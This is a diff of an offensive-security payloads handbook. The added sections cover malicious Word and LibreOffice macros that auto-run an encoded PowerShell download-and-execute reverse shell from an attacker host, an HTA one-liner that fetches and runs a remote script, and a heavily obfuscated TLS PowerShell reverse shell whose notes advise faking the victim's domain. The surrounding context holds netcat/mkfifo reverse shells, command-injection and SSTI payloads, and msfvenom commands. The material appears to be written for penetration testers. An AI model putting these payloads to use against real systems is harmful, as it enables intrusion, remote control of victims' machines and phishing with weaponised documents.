@@ -4,6 +4,7 @@
 
 ## Table of Contents
 
+- [An HTML Application (HTA)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#An-HTML-Application-HTA)
 - [Background Reverse Shells](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Background-Reverse-Shells)
 - [Bad PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bad-PDF)
 - [Bash Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bash-Reverse-Shell)
@@ -19,6 +20,8 @@
 - [JDWP](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#JDWP)
 - [Lua Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Lua-Reverse-Shell)
 - [.LNK (Link) Files](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#LNK-Link-File)
+- [Macros](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Macros)
+- [marco_pack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#macro-pack)
 - [Markdown Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Markdown-Reverse-Shell)
 - [mkfifo Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#mkfifo-Reverse-Shell)
 - [msfvenom](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#msfvenom)
@@ -38,6 +41,8 @@
 - [.SCF (Shell Command File) File](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#SCF-Shell-Command-File-File)
 - [Spoofing Office Marco](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Spoofing-Office-Macro)
 - [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Server-Side-Template-Injection-SSTI)
+- [Visual Basic for Application (VBA)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Visual-Basic-for-Application-VBA)
+- [Windows Scripting Host (WSH)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Windows-Scripting-Host-WSH)
 - [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Cross-Site-Scripting-XSS)
 - [xterm Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#xterm-Reverse-Shell)
 - [ysoserial](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#ysoserial)
@@ -47,56 +52,49 @@
 
 | Name | Description | URL |
 | --- | --- | --- |
-| charlotte | c++ fully undetected shellcode launcher ;) | https://github.com/9emin1/charlotte |
-| Chimera | Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions. | https://github.com/tokyoneon/Chimera |
-| Codecepticon | .NET/PowerShell/VBA Offensive Security Obfuscator | https://github.com/sadreck/Codecepticon |
-| Donut | Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. | https://github.com/TheWover/donut |
-| EDRSandBlast | EDRSandBlast is a tool written in C that weaponize a vulnerable signed driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks and ETW TI provider) and LSASS protections. | https://github.com/wavestone-cdt/EDRSandblast |
 | EXE_to_DLL | Converts a EXE into DLL | https://github.com/hasherezade/exe_to_dll |
-| Freeze | Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods | https://github.com/Tylous/Freeze |
 | GadgetToJScript | A tool for generating .NET serialized gadgets that can trigger .NET assembly load/execution when deserialized using BinaryFormatter from JS/VBS/VBA based scripts. | https://github.com/med0x2e/GadgetToJScript |
 | hoaxshell | An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic. | https://github.com/t3l3machus/hoaxshell |
 | Intruder Payloads | A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists. | https://github.com/1N3/IntruderPayloads |
-| Invoke-Obfuscation | PowerShell Obfuscator | https://github.com/danielbohannon/Invoke-Obfuscation |
 | Ivy | Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code directly in memory. Ivy’s loader does this by utilizing programmatical access in the VBA object environment to load, decrypt and execute shellcode. | https://github.com/optiv/Ivy |
-| LimeLighter | A tool for generating fake code signing certificates or signing real ones | https://github.com/Tylous/Limelighter |
 | marshalsec | Java Unmarshaller Security | https://github.com/mbechler/marshalsec |
-| mimikatz Obfuscator | This script downloads and slightly obfuscates the mimikatz project. | https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781 |
-| Mortar Loader | Evasion technique to defeat and divert detection and prevention of security products (AV/EDR/XDR) | https://github.com/0xsp-SRD/mortar |
-| NET-Obfuscate | Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender AMSI  | https://github.com/BinaryScary/NET-Obfuscate |
-| NetLoader | Loads any C# binary in mem, patching AMSI + ETW. | https://github.com/Flangvik/NetLoader |
-| NimBlackout | Kill AV/EDR leveraging BYOVD attack | https://github.com/Helixo32/NimBlackout |
-| Nimcrypt2 | .NET, PE, & Raw Shellcode Packer/Loader Written in Nim | https://github.com/icyguider/Nimcrypt2 |
-| NimPackt-v1 | Nim-based assembly packer and shellcode loader for opsec & profit | https://github.com/chvancooten/NimPackt-v1 |
 | Nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
 | ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
-| Obfuscar | Open source obfuscation tool for .NET assemblies | https://github.com/obfuscar/obfuscar |
-| Obfuscator-LLVM | The aim of this project is to provide an open-source fork of the LLVM compilation suite able to provide increased software security through code obfuscation and tamper-proofing. | https://github.com/obfuscator-llvm/obfuscator |
-| OffensivePipeline | OffensivePipeline allows to download, compile (without Visual Studio) and obfuscate C# tools for Red Team exercises.  | https://github.com/Aetsu/OffensivePipeline |
 | p0wny@shell:~# | Single-file PHP shell | https://github.com/flozz/p0wny-shell |
 | Payload Box | Payload Collection | https://github.com/payloadbox |
 | PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | PHP shells that work on Linux OS, macOS, and Windows OS. | https://github.com/ivan-sincek/php-reverse-shell |
 | pixload | Image Payload Creating/Injecting tools | https://github.com/sighook/pixload |
-| PowerShell Encoder (CyberChef) | Receipe for encoding PowerShell Payloads for Windows | https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D') |
-| PSByPassCLM | Bypass for PowerShell Constrained Language Mode | https://github.com/padovah4ck/PSByPassCLM |
 | PySoSerial | PySoSerial is a tool for identification and exploitation of insecure deserialization vulnerabilities in python. | https://github.com/burw0r/PySoSerial |
-| ScareCrow | Payload creation framework designed around EDR bypass. | https://github.com/Tylous/ScareCrow |
-| SharpEvader | This is a python script which automatically generates metepreter tcp or https shellcode encodes it and slaps some Behavioural detection in a c# Project for you to build and run | https://github.com/Xyan1d3/SharpEvader |
 | SharpPyShell | SharPyShell - tiny and obfuscated ASP.NET webshell for C# web applications | https://github.com/antonioCoco/SharPyShell |
-| ShellcodeEncryptor | A simple shell code encryptor/decryptor/executor to bypass anti virus. | https://github.com/plackyhacker/Shellcode-Encryptor |
-| Shikata Ga Nai | Shikata ga nai (仕方がない) encoder ported into go with several improvements. | https://github.com/EgeBalci/sgn |
-| Simple Injector | A simple injector that uses LoadLibraryA | https://github.com/tomcarver16/SimpleInjector |
-| unicorn | Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18. | https://github.com/trustedsec/unicorn |
-| Veil | Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. | https://github.com/Veil-Framework/Veil |
 | webshell | This is a webshell open source project | https://github.com/tennc/webshell |
 | WebShell | Webshell && Backdoor Collection | https://github.com/xl7dev/WebShell |
 | Weevely | Weaponized web shell | https://github.com/epinna/weevely3 |
 | woodpecker | Log4j jndi injects the Payload generator | https://github.com/woodpecker-appstore/log4j-payload-generator |
-| yetAnotherObfuscator | C# obfuscator that bypass windows defender | https://github.com/0xb11a1/yetAnotherObfuscator |
 | ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
 | ysoserial.net | Deserialization payload generator for a variety of .NET formatters | https://github.com/pwntester/ysoserial.net |
+
+## An HTML Application (HTA)
+
+### payload.hta
+
+```c
+<html>
+<body>
+<script>
+  var c= 'cmd.exe'
+  new ActiveXObject('Wscript.Shell').Run(c);
+</script>
+</body>
+</html>
+```
+
+### One-Liner
+
+```c
+<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://<LHOST>/<FILE>.ps1')"</scRipt>
+```
 
 ## Background Reverse Shells
 
@@ -193,24 +191,6 @@ $ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<
 
 ```c
 $ curl -i -s -k -X $'POST' -H $'Host: api.<RHOST>' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzIyMjk2LCJleHAiOjE2MzI5MTQyOTZ9.y8GGfvwe1LPGOGJUVjmzMIsZaR5aok60X6fmEnAHvMg' -H $'Content-Type: application/json' -H $'Origin: http://api.<RHOST>' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)\",\"port\":\"1337\"\}' $'http://api.<RHOST>/admin/plugins/install' --proxy http://127.0.0.1:8080
-```
-
-## Donut
-
-> https://github.com/TheWover/donut
-
-### Installation
-
-```c
-$ make
-$ make clean
-$ make debug
-```
-
-### Obfuscation
-
-```c
-$ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
 ```
 
 ## Exiftool
@@ -332,8 +312,8 @@ window.setInterval(function(){
 
 ```c
 <!doctype html>
-		<script src="log.js">
-	</script>
+    <script src="log.js">
+  </script>
 </body></html>
 ```
 
@@ -348,7 +328,7 @@ $ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamR
 ## Lua Reverse Shell
 
 ```c
-http://<DOMAIN>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
+http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
 ```
 
 ## .LNK (Link) File
@@ -385,6 +365,95 @@ $shortcut.Save()
 C:\> attrib -h Z:\PATH\TO\FOLDER\<FOLDER>
 ```
 
+## Macros
+
+### Create malicious Word Documents
+
+#### Payload
+
+```c
+IEX(New-Object System.Net.WebClient).DownloadString("http://<LHOST>/powercat.ps1");powercat -c <LHOST> -p <LPORT> -e powershell
+```
+
+> https://www.base64decode.org/
+
+Now `Base64 encode` it with `UTF-16LE` and `LF (Unix)`.
+
+```c
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEgATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwBUAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA=
+```
+
+#### Python Script for Formatting
+
+```c
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEgATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwBUAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA="
+
+n = 50
+
+for i in range(0, len(str), n):
+        print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+
+```c
+$ python3 script.py 
+Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
+Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
+Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
+Str = Str + "GQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEg"
+Str = Str + "ATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAK"
+Str = Str + "QA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwB"
+Str = Str + "UAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvA"
+Str = Str + "HcAZQByAHMAaABlAGwAbAA="
+```
+
+#### Final Macro
+
+```c
+Sub AutoOpen()
+    MalMacro
+End Sub
+
+Sub Document_Open()
+    MalMacro
+End Sub
+
+Sub MalMacro()
+    Dim Str As String
+
+        Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
+        Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
+        Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
+        Str = Str + "GQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8APABMAEg"
+        Str = Str + "ATwBTAFQAPgAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACIAK"
+        Str = Str + "QA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADwATABIAE8AUwB"
+        Str = Str + "UAD4AIAAtAHAAIAA8AEwAUABPAFIAVAA+ACAALQBlACAAcABvA"
+        Str = Str + "HcAZQByAHMAaABlAGwAbAA="
+
+    CreateObject("Wscript.Shell").Run Str
+
+End Sub
+```
+
+### Create malicious Libre Office Documents
+
+```c
+Sub Main
+
+    Shell("cmd.exe /c powershell -e JAjA<--- CUT FOR BREVITY --->AA==")
+    
+End Sub
+```
+
+Now `assign` the `macro` to an `event`.
+
+*Tools > Customize > Events > Open Document*
+
+## marco_pack
+
+```c
+PS C:\macro_pack_pro> echo .\<FILE>.bin | marco_pack.exe -t SHELLCODE -G .\<FILE>.pdf.lnk --icon='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13' --hta-macro --bypass
+```
+
 ## Markdown Reverse Shell
 
 ```c
@@ -412,7 +481,6 @@ $ msfvenom --list formats    // list formats for payloads
 $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>.elf
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f WAR > <FILE>.war
 $ msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e php/base64 -f raw
-
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o "r'<FILE>.exe"
 $ msfvenom -p windows/x64/exec CMD='\\<LHOST>\PATH\TO\SHARE\nc.exe <LHOST> <LPORT> -e cmd.exe' -f dll > <FILE>.dll
@@ -578,6 +646,19 @@ $ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>
 $  powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
+### Obfuscated Reverse Shell
+
+```c
+$gnlSlSXDZ = & ([string]::join('', ( ($(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),($(119)),$(0+0-0-0-0+45),$($(79)),$(((98))),($(106)),$(101+101+0-0-0-0-0+0-101),$(99+99+0-99),$($(116))) |ForEach-Object{$_<##>}|%{ ( [char][int] $_<#ZdQB8miMexFGoshJ4qKRp1#>)})) |ForEach-Object{<##>$($_)}| % {<#HWEG3yFVCbNOvfYute5#>$_<#o#>}) ([string]::join('', ( ($(83+83+0+0+0-0-83),$(((121))),((115)),$($(116)),$(101+101+0-0-0-0-0+0-101),(($(109))),(46),$(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),$($(116)),(46),$(83+83+0+0+0-0-83),$(0+0+0+0+111),$(99+99+0-99),(107),$(101+101+0-0-0-0-0+0-101),$($(116)),((115)),(46),(84),($(67)),$(80),($(67)),$(0-0+0-108+108+108),$(0+105),$(101+101+0-0-0-0-0+0-101),(110),$($(116))) |ForEach-Object{$($_)<##>}|%{ ( [char][int] <##>$($_)<##>)})) |ForEach-Object{<#FLut3kIYDMAyO9a2hEH0zQJ4w#>$_<#WI8r#>}| % {<#OjUEN8nkxf#>$($_)})("J5q0aMgvL.xAeq3T8MEcL6sRaXUrOZ.SHUZv12CgW0es7xPkJmtFo.CbYjgiDaIe7GWdPs".replace('CbYjgiDaIe7GWdPs',DDDDDDDD).replace('SHUZv12CgW0es7xPkJmtFo',CCCCCCCC).replace('J5q0aMgvL',AAAAAAAA).replace('xAeq3T8MEcL6sRaXUrOZ',BBBBBBBB),$(EEEEEEEE));$fU4QP = $gnlSlSXDZ.GetStream();$h1okj42 = New-Object System.Net.Security.SslStream($fU4QP,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$h1okj42.AuthenticateAsClient('FFFFFFFF', $null, "Tls12", $false);$nf1083fj = new-object System.IO.StreamWriter($h1okj42);$nf1083fj.Write('PS ' + (pwd).Path + '> ');$nf1083fj.flush();[byte[]]$h8r109 = 0..65535|%{0};while(($nf839nf = $h1okj42.Read($h8r109, 0, $h8r109.Length)) -ne 0){$nr81of = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($h8r109,0, $nf839nf);$ngrog49 = (iex $nr81of | Out-String ) 2>&1;$nir1048 = $ngrog49 + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($nir1048);$h1okj42.Write($sendbyte,0,$sendbyte.Length);$h1okj42.Flush()};
+```
+
+- AAAAAAAA == 1st octet of <LHOST>
+- BBBBBBBB == 2nd octet of <LHOST>
+- CCCCCCCC == 3rd octet of <LHOST>
+- DDDDDDDD == 4th octet of <LHOST>
+- EEEEEEEE == <LHOST>
+- FFFFFFFF == Domain to auth as (doesn't really matter, use something that looks like theirs)
+
 ### minireverse.ps1
 
 ```c
@@ -589,19 +670,19 @@ $buffer = new-object System.Byte[] 1024;
 $encoding = new-object System.Text.AsciiEncoding;
 do
 {
-    $writer.Flush();
-    $read = $null;
-    $res = ""
-    while($stream.DataAvailable -or $read -eq $null) {
-        $read = $stream.Read($buffer, 0, 1024)
-    }
-    $out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-    if(!$out.equals("exit")){
-        $args = "";
-        if($out.IndexOf(' ') -gt -1){
-            $args = $out.substring($out.IndexOf(' ')+1);
-            $out = $out.substring(0,$out.IndexOf(' '));
-            if($args.split(' ').length -gt 1){
+	$writer.Flush();
+	$read = $null;
+	$res = ""
+	while($stream.DataAvailable -or $read -eq $null) {
+		$read = $stream.Read($buffer, 0, 1024)
+	}
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$args = "";
+		if($out.IndexOf(' ') -gt -1){
+			$args = $out.substring($out.IndexOf(' ')+1);
+			$out = $out.substring(0,$out.IndexOf(' '));
+			if($args.split(' ').length -gt 1){
                 $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                 $pinfo.FileName = "cmd.exe"
                 $pinfo.RedirectStandardError = $true
@@ -619,18 +700,18 @@ do
                 } else {
                     $res = $stdout
                 }
-            }
-            else{
-                $res = (&"$out" "$args") | out-string;
-            }
-        }
-        else{
-            $res = (&"$out") | out-string;
-        }
-        if($res -ne $null){
+			}
+			else{
+				$res = (&"$out" "$args") | out-string;
+			}
+		}
+		else{
+			$res = (&"$out") | out-string;
+		}
+		if($res -ne $null){
         $writer.WriteLine($res)
     }
-    }
+	}
 }While (!$out.equals("exit"))
 $writer.close();
 $socket.close();
@@ -658,89 +739,6 @@ exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
 
 ```c
 $ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-```
-
-## ScareCrow
-
-> https://github.com/Tylous/ScareCrow
-
-### Payloads
-
-#### Shellcode
-
-```c
-$ ScareCrow -I <FILE>.bin -Loader binary -domain <FAKE_DOMAIN>
-```
-
-#### Shellcode Payload Creation with msfvenom
-
-```c
-$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
-```
-
-#### .msi-File Payload Creation with msfvenom
-
-```c
-$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
-```
-
-#### Listener
-
-```c
-msf6 > use exploit/multi/handler
-msf6 > set payload windows/x64/meterpreter/reverse_https
-```
-
-### Obfuscation
-
-#### DLL Side-Loading
-
-```c
-$ ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
-```
-#### Windows Script Host
-
-```c
-$ ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
-```
-
-#### Control Panel Files
-
-```c
-$ ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
-```
-
-#### Process Injection
-
-```c
-$ ScareCrow -I <FILE>.bin -injection "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" -domain <FAKE_DOMAIN>
-```
-
-### Renaming Payload
-
-```c
-$ mv <FILE>.dll <FILE>32.dll
-```
-
-### Execution
-
-```c
-PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
-```
-
-or
-
-```c
-PS C:\> regsvr32 /s .\<FILE>32.dll
-```
-
-For `.cpl-Files` a simple double click is enough to execute them.
-
-### Evasion focused Execution
-
-```c
-PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>.dll}
-PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>_dll.txt}
 ```
 
 ## .SCF (Shell Command File) File
@@ -812,6 +810,61 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ${T(java.lang.System).getenv()}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+```
+
+## Visual Basic for Application (VBA)
+
+### Basic Structure
+
+Navigate to: `View > Macros`
+
+```c
+Sub Document_Open()
+  Macro
+End Sub
+
+Sub AutoOpen()
+  Macro
+End Sub
+
+Sub Macro()
+  MsgBox ("FOOBAR")
+End Sub
+```
+
+Save it as `<FILE>.doc` or `<FILE>.docm`.
+
+### Malicious Function
+
+```c
+Sub Exec()
+  Dim payload As String
+  payload = "calc.exe"
+  CreateObject("Wscript.Shell").Run payload,0
+End Sub
+```
+
+Create `AutoOpen()` and `DocumentOpen()` functions to execute the `malicious script`.
+
+## Windows Scripting Host (WSH)
+
+```c
+C:\> wscript <FILE>.vbs
+C:\> cscript <FILE>.vbs
+C:\> wscript /e:VBScript C:\<FILE>.txt
+```
+
+### Examples
+
+```c
+Dim message
+message = "<FOOBAR>"
+MsgBox message
+```
+
+```c
+Set shell = WScript.CreateObject(Wscript.Shell"")
+shell.Run("C:\Windows\System32\calc.exe" & WScript.ScriptFullName),0,True
 ```
 
 ## Cross-Site Scripting (XSS)
